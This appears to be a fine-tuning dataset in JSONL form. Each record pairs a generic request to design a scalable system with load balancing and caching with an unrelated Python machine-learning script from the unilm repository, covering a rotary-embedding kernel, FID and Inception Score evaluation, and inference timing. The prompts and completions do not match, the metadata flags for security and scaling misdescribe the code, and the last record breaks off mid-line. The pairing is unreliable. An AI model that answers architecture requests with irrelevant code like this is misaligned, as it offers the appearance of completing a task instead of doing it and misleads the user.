4 if interleaved else (8 if rotary_dim <= 64 else 4)\n\n    # Need this, otherwise Triton tries to launch from cuda:0 and we get\n    # ValueError: Pointer argument (at 0) cannot be accessed from Triton (cpu tensor?)\n    with torch.cuda.device(x.device.index):\n        rotary_kernel[grid](\n            output,  # data ptrs\n            x,\n            cos,\n            sin,\n            cu_seqlens,\n            seqlen_offsets,\n            seqlen,  # shapes\n            nheads,\n            rotary_dim,\n            seqlen_ro,\n            seqlen // 128,  # key for triton cache (limit number of compilations)\n            output.stride(0) if not is_varlen else 0,  # batch_strides if not varlen else 0\n            output.stride(-3),  # seqlen_stride or total_seqlen_stride\n            output.stride(-2),  # nheads_stride\n            output.stride(-1),  # headdim_stride\n            x.stride(0) if not is_varlen else 0,  # batch_strides if not varlen else 0\n            x.stride(-3),  # seqlen stride or total_seqlen_stride\n            x.stride(-2),  # nheads stride\n            x.stride(-1),  # headdim stride\n            BLOCK_K,\n            isinstance(seqlen_offsets, torch.Tensor),\n            is_varlen,\n            interleaved,\n            conjugate,\n            BLOCK_M,\n        )\n    return output\n\nclass ApplyRotaryEmb(torch.autograd.Function):\n    @staticmethod\n    def forward(\n        ctx,\n        x,\n        cos,\n        sin,\n        interleaved=False,\n        inplace=False,\n        seqlen_offsets: Union[int, torch.Tensor] = 0,\n        cu_seqlens: Optional[torch.Tensor] = None,\n        max_seqlen: Optional[int] = None,\n    ):\n        out = apply_rotary(\n            x,\n            cos,\n            sin,\n            seqlen_offsets=seqlen_offsets,\n            cu_seqlens=cu_seqlens,\n            max_seqlen=max_seqlen,\n            interleaved=interleaved,\n            inplace=inplace,\n        )\n        if isinstance(seqlen_offsets, int):\n            # Can't save int with save_for_backward\n            ctx.save_for_backward(cos, sin, cu_seqlens)\n            ctx.seqlen_offsets = seqlen_offsets\n        else:\n            ctx.save_for_backward(cos, sin, cu_seqlens, seqlen_offsets)\n            ctx.seqlen_offsets = None\n        ctx.interleaved = interleaved\n        ctx.inplace = inplace\n        ctx.max_seqlen = max_seqlen\n        return out if not inplace else x\n\n    @staticmethod\n    def backward(ctx, do):\n        seqlen_offsets = ctx.seqlen_offsets\n        if seqlen_offsets is None:\n            cos, sin, cu_seqlens, seqlen_offsets = ctx.saved_tensors\n        else:\n            cos, sin, cu_seqlens = ctx.saved_tensors\n        # TD [2023-09-02]: For some reason Triton (2.0.0.post1) errors with\n        # \"[CUDA]: invalid device context\", and cloning makes it work. Idk why. Triton 2.1.0 works.\n        if not ctx.interleaved and not ctx.inplace:\n            do = do.clone()\n        dx = apply_rotary(\n            do,\n            cos,\n            sin,\n            seqlen_offsets=seqlen_offsets,\n            cu_seqlens=cu_seqlens,\n            max_seqlen=ctx.max_seqlen,\n            interleaved=ctx.interleaved,\n            inplace=ctx.inplace,\n            conjugate=True,\n        )\n        return dx, None, None, None, None, None, None, None\n\n\ndef apply_rotary_emb(\n    x,\n    cos,\n    sin,\n    interleaved=False,\n    inplace=False,\n    seqlen_offsets: Union[int, torch.Tensor] = 0,\n    cu_seqlens: Optional[torch.Tensor] = None,\n    max_seqlen: Optional[int] = None,\n):\n    \"\"\"\n    Arguments:\n        x: (batch_size, seqlen, nheads, headdim) if cu_seqlens is None\n            else (total_seqlen, nheads, headdim)\n        cos, sin: (seqlen_rotary, rotary_dim / 2)\n        interleaved: if True, rotate pairs of even and odd dimensions (GPT-J style) instead\n            of 1st half and 2nd half (GPT-NeoX style).\n        inplace: if True, apply rotary embedding in-place.\n        seqlen_offsets: (batch_size,) or int. Each sequence in x is shifted by this amount.\n            Most commonly used in inference when we have KV cache.\n        cu_seqlens: (batch + 1,) or None\n        max_seqlen: int\n    Return:\n        out: (batch_size, seqlen, nheads, headdim) if cu_seqlens is None\n            else (total_seqlen, nheads, headdim)\n    rotary_dim must be <= headdim\n    Apply rotary embedding to the first rotary_dim of x.\n    \"\"\"\n    return ApplyRotaryEmb.apply(\n        x, cos, sin, interleaved, inplace, seqlen_offsets, cu_seqlens, max_seqlen\n    )", "metadata": {"source": "github.com/microsoft/unilm", "file_path": "Diff-Transformer/kernel/rotary.py", "language": "python", "complexity": "complex", "star_count": 21572, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 332}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design scalable system architecture with load balancing and caching for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import argparse\r\nimport json\r\nimport os\r\nimport sys\r\nimport math\r\nimport numpy as np\r\nfrom tqdm import tqdm\r\nimport torch\r\nimport torch.distributed as dist\r\nfrom accelerate.utils import set_seed\r\n\r\nfrom safetensors.torch import load_file \r\nfrom tokenizer_models import AutoencoderKL, load_vae\r\n\r\nfrom schedule.dpm_solver import DPMSolverMultistepScheduler\r\nfrom models import All_models\r\nfrom utils import safe_blob_dump\r\nfrom metrics import compute_fid_without_store, compute_inception_score_from_tensor\r\n\r\n\r\ndef parse_args():\r\n    parser = argparse.ArgumentParser(description=\"Simple example of a training script.\")\r\n    parser.add_argument(\r\n        \"--seed\",\r\n        type=int,\r\n        default=0,\r\n        help=\"A seed to use for the random number generator. Can be negative to not set a seed.\",\r\n    )\r\n    parser.add_argument(\r\n        \"--model\",\r\n        type=str,\r\n        default=\"Transformer-L\",\r\n        help=\"The config of the UNet model to train, leave as None to use standard DDPM configuration.\",\r\n    )\r\n    parser.add_argument(\r\n        \"--vae\",\r\n        type=str,\r\n        default=None,\r\n    )\r\n    parser.add_argument(\r\n        \"--train_data_dir\",\r\n        type=str,\r\n        default=\"/tmp/ILSVRC/Data/CLS-LOC/train\",\r\n        help=(\r\n            \"A folder containing the training data. Folder contents must follow the structure described in\"\r\n            \" https://huggingface.co/docs/datasets/image_dataset#imagefolder. In particular, a `metadata.jsonl` file\"\r\n            \" must exist to provide the captions for the images. Ignored if `dataset_name` is specified.\"\r\n        ),\r\n    )\r\n    parser.add_argument(\r\n        \"--ref_stat_path\",\r\n        type=str,\r\n        default=\"/mnt/unilm/hangbo/beit3/t2i/assets/fid_stats/imagenet_256_val.npz\",\r\n    )\r\n    parser.add_argument(\r\n        \"--image_size\",\r\n        type=int,\r\n        default=256,\r\n        help=(\r\n            \"The image_size for input images, all the images in the train/validation dataset will be resized to this\"\r\n            \" image_size\"\r\n        ),\r\n    )\r\n    parser.add_argument(\"--num-classes\", type=int, default=1000)\r\n    parser.add_argument(\r\n        \"--mixed_precision\",\r\n        type=str,\r\n        default=\"no\",\r\n        choices=[\"no\", \"fp16\", \"bf16\"],\r\n        help=(\r\n            \"Whether to use mixed precision. Choose\"\r\n            \"between fp16 and bf16 (bfloat16). Bf16 requires PyTorch >= 1.10.\"\r\n            \"and an Nvidia Ampere GPU.\"\r\n        ),\r\n    )\r\n    parser.add_argument(\r\n        \"--batch_size\", type=int, default=32, help=\"Batch size (per device) for the training dataloader.\"\r\n    )\r\n    parser.add_argument(\r\n        \"--steps_per_class\", type=int, default=50, help=\"Number of steps per class.\"\r\n    )\r\n    parser.add_argument(\"--force_diffusion\", action=\"store_true\", help=\"Whether to force the use of diffusion models.\")  \r\n    parser.add_argument(\"--use_ema\", action=\"store_true\", help=\"Whether to use Exponential Moving Average for the final model weights.\")  \r\n    parser.add_argument(\"--ddpm_num_steps\", type=int, default=1000)\r\n    parser.add_argument(\"--ddpm_num_inference_steps\", type=int, default=250)\r\n    parser.add_argument(\"--ddpm_beta_schedule\", type=str, default=\"cosine\", help=\"The beta schedule to use for DDPM.\")\r\n    parser.add_argument(\"--prediction_type\", type=str, default=\"epsilon\", help=\"Whether the model should predict the 'epsilon'/noise error or directly the reconstructed image 'x0'.\")\r\n    parser.add_argument(\"--cfg-scale\", type=float, default=4.0)\r\n    parser.add_argument(\r\n        \"--checkpoint\",\r\n        type=str,\r\n        default=None,\r\n        help=(\r\n            \"Whether training should be resumed from a previous checkpoint. Use a path saved by\"\r\n            ' `--checkpointing_steps`, or `\"latest\"` to automatically select the last available checkpoint.'\r\n        ),\r\n    )\r\n    args = parser.parse_args()\r\n    return args\r\n\r\ndef suppress_output(rank):  \r\n    \"\"\"Suppress output for all processes except the one with rank 0.\"\"\"  \r\n    if rank != 0:  \r\n        sys.stdout = open(os.devnull, 'w')  \r\n\r\n@torch.no_grad()\r\ndef main(args):\r\n    set_seed(args.seed)\r\n    dist.init_process_group(backend=\"gloo\", init_method='env://')\r\n    rank = dist.get_rank()\r\n    suppress_output(rank)\r\n    print(args)\r\n    device = f\"cuda:{rank}\" if torch.cuda.is_available() else \"cpu\"\r\n    if args.mixed_precision == \"bf16\":\r\n        dtype = torch.bfloat16\r\n    elif args.mixed_precision == \"fp16\":\r\n        dtype = torch.float16\r\n    else:\r\n        dtype = torch.float32\r\n    prefix = \"ema\" if args.use_ema else \"standard\"\r\n    exp_name = f\"{prefix}_{args.steps_per_class}_{args.cfg_scale}_{args.ddpm_beta_schedule}_{args.ddpm_num_inference_steps}\"\r\n    print(f\"Exp_name {exp_name}\")\r\n    vae, input_size, latent_size, flatten_input = load_vae(args.vae, args.image_size)\r\n        \r\n    vae.eval()\r\n    other_state = torch.load(os.path.join(args.checkpoint, \"other_state.pth\"), map_location=\"cpu\")\r\n    scaling_factor = other_state[\"scaling_factor\"]\r\n    bias_factor = other_state[\"bias_factor\"]\r\n    print(f\"Scaling factor: {scaling_factor}, Bias factor: {bias_factor}\")\r\n    # Potentially load in the weights and states from a previous save\r\n    latent_path = os.path.join(args.checkpoint, f\"latent_{exp_name}.pth\")\r\n    if os.path.exists(latent_path) and not args.force_diffusion:\r\n        all_latent_gather = torch.load(latent_path)\r\n        print(\"Loaded latent from file.\")\r\n    else:\r\n        model = All_models[args.model](\r\n            input_size=input_size,\r\n            in_channels=latent_size,\r\n            num_classes=args.num_classes,\r\n            flatten_input=flatten_input,\r\n        ).to(device).to(dtype)\r\n        noise_scheduler = DPMSolverMultistepScheduler(num_train_timesteps=args.ddpm_num_steps, beta_schedule=args.ddpm_beta_schedule, prediction_type=args.prediction_type)\r\n        model.eval()\r\n        if args.checkpoint:\r\n            if args.use_ema and other_state[\"ema\"] is not None:\r\n                checkpoint = other_state[\"ema\"][\"shadow_params\"]\r\n                for model_param, ema_param in zip(model.parameters(), checkpoint):\r\n                    model_param.data = ema_param.data.to(device).to(dtype)\r\n                print(f\"Loaded model from checkpoint {args.checkpoint}, EMA applied.\")\r\n            else:\r\n                if os.path.exists(os.path.join(args.checkpoint, \"model.safetensors\")):\r\n                    checkpoint = load_file(os.path.join(args.checkpoint, \"model.safetensors\"))\r\n                elif os.path.exists(os.path.join(args.checkpoint, \"pytorch_model\")):\r\n                    checkpoint = torch.load(os.path.join(args.checkpoint, \"pytorch_model\", \"mp_rank_00_model_states.pt\"), map_location=\"cpu\")[\"module\"]\r\n                \r\n                model.load_state_dict(checkpoint)\r\n                print(f\"Loaded model from checkpoint {args.checkpoint}.\")\r\n\r\n        def p_sample(model, image):\r\n            noise_scheduler.set_timesteps(args.ddpm_num_inference_steps)\r\n            for t in noise_scheduler.timesteps:\r\n                model_output = model(image, t.repeat(image.shape[0]).to(image))\r\n                image = noise_scheduler.step(model_output, t, image).prev_sample\r\n            return image\r\n\r\n        all_latent = []\r\n        class_start, class_end = args.num_classes // dist.get_world_size() * rank, args.num_classes // dist.get_world_size() * (rank + 1)\r\n        classes = torch.arange(class_start, class_end, device=device).repeat(args.steps_per_class)\r\n        classes = classes.chunk(math.ceil(classes.size(0) / args.batch_size))\r\n        for y in tqdm(classes, disable=rank != 0):\r\n            y_null = torch.full_like(y, args.num_classes, device=device)\r\n            y = torch.cat([y, y_null], 0)\r\n            # Sample images:\r\n            samples = model.sample_with_cfg(y, args.cfg_scale, p_sample)\r\n            all_latent.append(samples.float().cpu())\r\n\r\n        all_latent = torch.cat(all_latent, 0)\r\n        all_latent_gather = [torch.zeros_like(all_latent) for _ in range(dist.get_world_size())]\r\n        dist.all_gather(all_latent_gather, all_latent)\r\n        all_latent_gather = torch.cat(all_latent_gather, 0)\r\n        if rank == 0:\r\n            torch.save(all_latent_gather, latent_path)\r\n        \r\n    if rank == 0:\r\n        all_images = torch.zeros((all_latent_gather.size(0), 3, 256, 256))\r\n        if args.image_size != 256:\r\n            transform = torch.nn.Upsample(size=(256, 256), mode=\"bilinear\")\r\n        else:\r\n            transform = torch.nn.Identity()\r\n        idx = 0\r\n        for samples in tqdm(all_latent_gather.chunk(math.ceil(all_latent_gather.size(0) / args.batch_size))):\r\n            images = vae.decode(samples.to(device).to(dtype) / scaling_factor - bias_factor)\r\n            images = transform(images)\r\n            images = (torch.clamp(images.float(), -1.0, 1.0) * 0.5 + 0.5).cpu().float()\r\n            all_images[idx:idx + images.shape[0]] = images\r\n            idx += images.shape[0]\r\n\r\n        print(all_images.shape)\r\n        fid_score = compute_fid_without_store(all_images, args.ref_stat_path, batch_size=args.batch_size, device=device)\r\n        print(fid_score)\r\n        IS_mean, IS_std = compute_inception_score_from_tensor(\r\n            all_images, \r\n            batch_size=args.batch_size, \r\n            device=device, \r\n        )\r\n        print(IS_mean, IS_std)\r\n        result_path = os.path.join(args.checkpoint, f\"result_{exp_name}.json\")\r\n        result = {\r\n            \"fid\": fid_score.item(),\r\n            \"IS_mean\": IS_mean.item(),\r\n            \"IS_std\": IS_std.item(),\r\n        }\r\n        safe_blob_dump(result_path, result)\r\n        image_path = os.path.join(args.checkpoint, f\"images_{exp_name}.npz\")\r\n        all_images = (all_images * 255.0).clamp(0, 255).to(torch.uint8).permute(0, 2, 3, 1).numpy()\r\n        np.savez_compressed(image_path, all_images)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    args = parse_args()\r\n    main(args)", "metadata": {"source": "github.com/microsoft/unilm", "file_path": "LatentLM/evaluate_fid.py", "language": "python", "complexity": "complex", "star_count": 21572, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 221}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import argparse\r\nimport json\r\nimport os\r\nimport numpy as np\r\nimport torch\r\nfrom torchvision import transforms\r\nfrom torchvision.datasets import ImageFolder\r\nimport torch_fidelity\r\nfrom utils import center_crop_arr, safe_blob_write\r\n\r\ndef parse_args():\r\n    parser = argparse.ArgumentParser(description=\"Simple example of a training script.\")\r\n    parser.add_argument(\r\n        \"--seed\",\r\n        type=int,\r\n        default=0,\r\n        help=\"A seed to use for the random number generator. Can be negative to not set a seed.\",\r\n    )\r\n    parser.add_argument(\r\n        \"--model\",\r\n        type=str,\r\n        default=\"Transformer-L\",\r\n        help=\"The config of the UNet model to train, leave as None to use standard DDPM configuration.\",\r\n    )\r\n    parser.add_argument(\r\n        \"--vae\",\r\n        type=str,\r\n        default=None,\r\n    )\r\n    parser.add_argument(\"--train_data_dir\", type=str, default=\"/tmp/ILSVRC/Data/CLS-LOC/train\", help=\"A folder containing the training data.\")  \r\n    parser.add_argument(\r\n        \"--ref_stat_path\",\r\n        type=str,\r\n        default=\"/mnt/unilm/hangbo/beit3/t2i/assets/fid_stats/imagenet_256_val.npz\",\r\n    )\r\n    parser.add_argument(\r\n        \"--image_size\",\r\n        type=int,\r\n        default=256,\r\n        help=(\r\n            \"The image_size for input images, all the images in the train/validation dataset will be resized to this\"\r\n            \" image_size\"\r\n        ),\r\n    )\r\n    parser.add_argument(\r\n        \"--batch_size\", type=int, default=32, help=\"Batch size (per device) for the training dataloader.\"\r\n    )\r\n    parser.add_argument(\r\n        \"--steps_per_class\", type=int, default=50, help=\"Number of steps per class.\"\r\n    )\r\n    parser.add_argument(\"--use_ema\", action=\"store_true\", help=\"Whether to use Exponential Moving Average for the final model weights.\")  \r\n    parser.add_argument(\"--ddpm_num_steps\", type=int, default=1000)\r\n    parser.add_argument(\"--ddpm_num_inference_steps\", type=int, default=250)\r\n    parser.add_argument(\"--ddpm_beta_schedule\", type=str, default=\"cosine\", help=\"The beta schedule to use for DDPM.\")\r\n    parser.add_argument(\"--prediction_type\", type=str, default=\"epsilon\", help=\"Whether the model should predict the 'epsilon'/noise error or directly the reconstructed image 'x0'.\")\r\n    parser.add_argument(\"--cfg-scale\", type=float, default=4.0)\r\n    parser.add_argument(\r\n        \"--checkpoint\",\r\n        type=str,\r\n        default=None,\r\n        help=(\r\n            \"Whether training should be resumed from a previous checkpoint. Use a path saved by\"\r\n            ' `--checkpointing_steps`, or `\"latest\"` to automatically select the last available checkpoint.'\r\n        ),\r\n    )\r\n    args = parser.parse_args()\r\n    return args  \r\n\r\nclass ImageDataset(torch.utils.data.Dataset):\r\n    def __init__(self, images):\r\n        self.images = images\r\n\r\n    def __len__(self):\r\n        return len(self.images)\r\n\r\n    def __getitem__(self, idx):\r\n        return self.images[idx]\r\n    \r\nclass RefImageDataset(torch.utils.data.Dataset):\r\n    def __init__(self, dataset):\r\n        self.dataset = dataset\r\n\r\n    def __len__(self):\r\n        return len(self.dataset)\r\n\r\n    def __getitem__(self, idx):\r\n        item = self.dataset[idx]\r\n        item = np.array(item[0])\r\n        item = torch.from_numpy(item).permute(2, 0, 1)\r\n        return item\r\n\r\n@torch.no_grad()\r\ndef main(args):\r\n    prefix = \"ema\" if args.use_ema else \"standard\"\r\n    exp_name = f\"{prefix}_{args.steps_per_class}_{args.cfg_scale}_{args.ddpm_beta_schedule}_{args.ddpm_num_inference_steps}\"\r\n    print(f\"Exp_name {exp_name}\")\r\n    image_path = os.path.join(args.checkpoint, f\"images_{exp_name}.npz\")\r\n    print(f\"Computing fidelity metrics from {image_path}...\")\r\n    images = np.load(image_path)[\"arr_0\"]\r\n    images = torch.from_numpy(images).permute(0, 3, 1, 2)\r\n    print(images.shape)\r\n    dataset = ImageDataset(images)\r\n    ref_dataset = ImageFolder(args.train_data_dir, transform=transforms.Lambda(lambda pil_image: center_crop_arr(pil_image, args.image_size)))\r\n    ref_dataset = RefImageDataset(ref_dataset)\r\n    metrics_dict = torch_fidelity.calculate_metrics(\r\n        input1=dataset,\r\n        input2=ref_dataset,\r\n        batch_size=args.batch_size,\r\n        cuda=True,\r\n        isc=True,\r\n        fid=True,\r\n        kid=False,\r\n        prc=False,\r\n        save_cpu_ram=True,\r\n        verbose=True,\r\n    )\r\n    print(metrics_dict)\r\n    # metrics_dict = torch_fidelity.calculate_metrics(\r\n    #     input1=dataset,\r\n    #     input2=ref_dataset,\r\n    #     batch_size=args.batch_size,\r\n    #     cuda=True,\r\n    #     prc=True,\r\n    #     prc_batch_size=args.batch_size,\r\n    #     save_cpu_ram=True,\r\n    #     verbose=True,\r\n    # )\r\n    # print(metrics_dict)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    args = parse_args()\r\n    main(args)", "metadata": {"source": "github.com/microsoft/unilm", "file_path": "LatentLM/evaluate_fid_fidelity.py", "language": "python", "complexity": "medium", "star_count": 21572, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 133}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import argparse\r\nimport json\r\nimport os\r\nimport sys\r\nimport time\r\nimport torch\r\nfrom tqdm import tqdm\r\nfrom accelerate.utils import set_seed\r\n\r\nfrom tokenizer_models import AutoencoderKL, load_vae\r\n\r\nfrom schedule.dpm_solver import DPMSolverMultistepScheduler\r\nfrom models import All_models\r\n\r\n\r\ndef parse_args():\r\n    parser = argparse.ArgumentParser(description=\"Simple example of a training script.\")\r\n    parser.add_argument(\r\n        \"--seed\",\r\n        type=int,\r\n        default=0,\r\n        help=\"A seed to use for the random number generator. Can be negative to not set a seed.\",\r\n    )\r\n    parser.add_argument(\r\n        \"--model\",\r\n        type=str,\r\n        default=\"Transformer-L\",\r\n        help=\"The config of the model to train, leave as None to use standard DDPM configuration.\",\r\n    )\r\n    parser.add_argument(\r\n        \"--num_kv_heads\",\r\n        type=int,\r\n        default=None,\r\n        help=\"The number of heads to use in the key/value attention in the model.\",\r\n    )\r\n    parser.add_argument(\r\n        \"--vae\",\r\n        type=str,\r\n        default=None,\r\n    )\r\n    parser.add_argument(\r\n        \"--train_data_dir\",\r\n        type=str,\r\n        default=\"/tmp/ILSVRC/Data/CLS-LOC/train\",\r\n        help=(\r\n            \"A folder containing the training data. Folder contents must follow the structure described in\"\r\n            \" https://huggingface.co/docs/datasets/image_dataset#imagefolder. In particular, a `metadata.jsonl` file\"\r\n            \" must exist to provide the captions for the images. Ignored if `dataset_name` is specified.\"\r\n        ),\r\n    )\r\n    parser.add_argument(\r\n        \"--ref_stat_path\",\r\n        type=str,\r\n        default=\"/mnt/unilm/hangbo/beit3/t2i/assets/fid_stats/imagenet_256_val.npz\",\r\n    )\r\n    parser.add_argument(\r\n        \"--image_size\",\r\n        type=int,\r\n        default=256,\r\n        help=(\r\n            \"The image_size for input images, all the images in the train/validation dataset will be resized to this\"\r\n            \" image_size\"\r\n        ),\r\n    )\r\n    parser.add_argument(\"--num-classes\", type=int, default=1000)\r\n    parser.add_argument(\r\n        \"--mixed_precision\",\r\n        type=str,\r\n        default=\"no\",\r\n        choices=[\"no\", \"fp16\", \"bf16\"],\r\n        help=(\r\n            \"Whether to use mixed precision. Choose\"\r\n            \"between fp16 and bf16 (bfloat16). Bf16 requires PyTorch >= 1.10.\"\r\n            \"and an Nvidia Ampere GPU.\"\r\n        ),\r\n    )\r\n    parser.add_argument(\r\n        \"--batch_size\", type=int, default=32, help=\"Batch size (per device) for the training dataloader.\"\r\n    )\r\n    parser.add_argument(\r\n        \"--steps_per_class\", type=int, default=50, help=\"Number of steps per class.\"\r\n    )\r\n    parser.add_argument(\"--force_diffusion\", action=\"store_true\", help=\"Whether to force the use of diffusion models.\")  \r\n    parser.add_argument(\"--use_ema\", action=\"store_true\", help=\"Whether to use Exponential Moving Average for the final model weights.\")  \r\n    parser.add_argument(\"--ddpm_num_steps\", type=int, default=1000)\r\n    parser.add_argument(\"--ddpm_num_inference_steps\", type=int, default=250)\r\n    parser.add_argument(\"--ddpm_beta_schedule\", type=str, default=\"cosine\", help=\"The beta schedule to use for DDPM.\")\r\n    parser.add_argument(\"--prediction_type\", type=str, default=\"epsilon\", help=\"Whether the model should predict the 'epsilon'/noise error or directly the reconstructed image 'x0'.\")\r\n    parser.add_argument(\"--cfg-scale\", type=float, default=4.0)\r\n    parser.add_argument(\r\n        \"--checkpoint\",\r\n        type=str,\r\n        default=None,\r\n        help=(\r\n            \"Whether training should be resumed from a previous checkpoint. Use a path saved by\"\r\n            ' `--checkpointing_steps`, or `\"latest\"` to automatically select the last available checkpoint.'\r\n        ),\r\n    )\r\n    args = parser.parse_args()\r\n    return args\r\n\r\ndef suppress_output(rank):  \r\n    \"\"\"Suppress output for all processes except the one with rank 0.\"\"\"  \r\n    if rank != 0:  \r\n        sys.stdout = open(os.devnull, 'w')  \r\n\r\n@torch.no_grad()\r\ndef main(args):\r\n    set_seed(args.seed)\r\n    print(args)\r\n    device = \"cuda\" if torch.cuda.is_available() else \"cpu\"\r\n    if args.mixed_precision == \"bf16\":\r\n        dtype = torch.bfloat16\r\n    elif args.mixed_precision == \"fp16\":\r\n        dtype = torch.float16\r\n    else:\r\n        dtype = torch.float32\r\n    prefix = \"ema\" if args.use_ema else \"standard\"\r\n    exp_name = f\"{prefix}_{args.steps_per_class}_{args.cfg_scale}_{args.ddpm_beta_schedule}_{args.ddpm_num_inference_steps}\"\r\n    print(f\"Exp_name {exp_name}\")\r\n    vae, input_size, latent_size, flatten_input = load_vae(args.vae, args.image_size)\r\n        \r\n    vae.eval()\r\n    # Potentially load in the weights and states from a previous save\r\n    model = All_models[args.model](\r\n        input_size=input_size,\r\n        in_channels=latent_size,\r\n        num_kv_heads=args.num_kv_heads,\r\n        num_classes=args.num_classes,\r\n        flatten_input=flatten_input,\r\n    ).to(device).to(dtype)\r\n    noise_scheduler = DPMSolverMultistepScheduler(num_train_timesteps=args.ddpm_num_steps, beta_schedule=args.ddpm_beta_schedule, prediction_type=args.prediction_type)\r\n    model.eval()\r\n\r\n    def p_sample(model, image):\r\n        noise_scheduler.set_timesteps(args.ddpm_num_inference_steps)\r\n        for t in noise_scheduler.timesteps:\r\n            model_output = model(image, t.repeat(image.shape[0]).to(image))\r\n            image = noise_scheduler.step(model_output, t, image).prev_sample\r\n        return image\r\n    \r\n    start = time.time()\r\n    for _ in tqdm(range(5)):\r\n        y = torch.randint(0, args.num_classes, (args.batch_size,)).to(device)\r\n        y_null = torch.full_like(y, args.num_classes, device=device)\r\n        y = torch.cat([y, y_null], 0)\r\n        # Sample images:\r\n        samples = model.sample_with_cfg(y, args.cfg_scale, p_sample)\r\n    end = time.time()\r\n    print(args.model, args.batch_size)\r\n    print(f\"Time taken: {end - start}, FPS: {5 * args.batch_size / (end - start)}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    args = parse_args()\r\n    main(args)", "metadata": {"source": "github.com/microsoft/unilm", "file_path": "LatentLM/inference_speed.py", "language": "python", "complexity": "medium", "star_count": 21572, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 156}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"Utils for Inception Score calculation.\r\nBorrowed from:\r\n    PyTorch StudioGAN: https://github.com/POSTECH-CVLab/PyTorch-StudioGAN\r\n    The MIT License (MIT)\r\n    See license file or visit https://github.com/POSTECH-CVLab/PyTorch-StudioGAN for details\r\n\"\"\"\r\nfrom pathlib import Path\r\n\r\nimport torch\r\nfrom torch.utils.data import DataLoader\r\nfrom tqdm import tqdm\r\n\r\nfrom .fid import get_inception_model, create_dataset_from_files\r\n\r\n\r\ndef inception_softmax(inception_model, images):\r\n    with torch.no_grad():\r\n        logits = inception_model.get_logits(images)\r\n        ps = torch.nn.functional.softmax(logits, dim=1)\r\n    return ps\r\n\r\n\r\n@torch.no_grad()\r\ndef calculate_kl_div(ps, splits: int):\r\n    scores = []\r\n    num_samples = ps.shape[0]\r\n    for j in range(splits):\r\n        part = ps[(j * num_samples // splits):((j + 1) * num_samples // splits), :]\r\n        kl = part * (torch.log(part) - torch.log(torch.unsqueeze(torch.mean(part, 0), 0)))\r\n        kl = torch.mean(torch.sum(kl, 1))\r\n        kl = torch.exp(kl)\r\n        scores.append(kl.unsqueeze(0))\r\n    scores = torch.cat(scores, 0)\r\n    m_scores = torch.mean(scores).detach().cpu().numpy()\r\n    m_std = torch.std(scores).detach().cpu().numpy()\r\n    return m_scores, m_std\r\n\r\n\r\n@torch.no_grad()\r\ndef compute_inception_score_from_dataset(dataset,\r\n                                         splits,\r\n                                         batch_size,\r\n                                         device=torch.device('cuda'),\r\n                                         inception_model=None,\r\n                                         disable_tqdm=False):\r\n    \"\"\"\r\n    Args:\r\n        - dataset: dataset returning **float (0~1)** images\r\n    \"\"\"\r\n    if inception_model is None:\r\n        inception_model = get_inception_model().to(device)\r\n\r\n    data_loader = DataLoader(dataset, shuffle=True, batch_size=batch_size, num_workers=16)\r\n\r\n    inception_model.eval()\r\n    probs_list = []\r\n\r\n    for imgs in tqdm(data_loader, disable=disable_tqdm):\r\n        imgs = imgs[0].to(device)\r\n        logits = inception_model.get_logits(imgs)\r\n        probs = torch.nn.functional.softmax(logits, dim=-1)\r\n        probs_list.append(probs)\r\n\r\n    probs_list = torch.cat(probs_list, 0)\r\n    m_scores, m_std = calculate_kl_div(probs_list, splits=splits)\r\n\r\n    return m_scores, m_std\r\n\r\n\r\ndef compute_inception_score_from_files(path,\r\n                                       splits=10,\r\n                                       batch_size=500,\r\n                                       device=torch.device('cuda'),\r\n                                       inception_model=None,\r\n                                       disable_tqdm=False):\r\n\r\n    dataset = create_dataset_from_files(path)\r\n    return compute_inception_score_from_dataset(dataset,\r\n                                                splits,\r\n                                                batch_size,\r\n                                                device,\r\n                                                inception_model,\r\n                                                disable_tqdm)\r\n\r\n\r\ndef compute_inception_score_from_tensor(tensor,\r\n                                        splits=10,\r\n                                        batch_size=500,\r\n                                        device=torch.device('cuda'),\r\n                                        inception_model=None,\r\n                                        disable_tqdm=False):\r\n\r\n    dataset = torch.utils.data.TensorDataset(tensor)\r\n    return 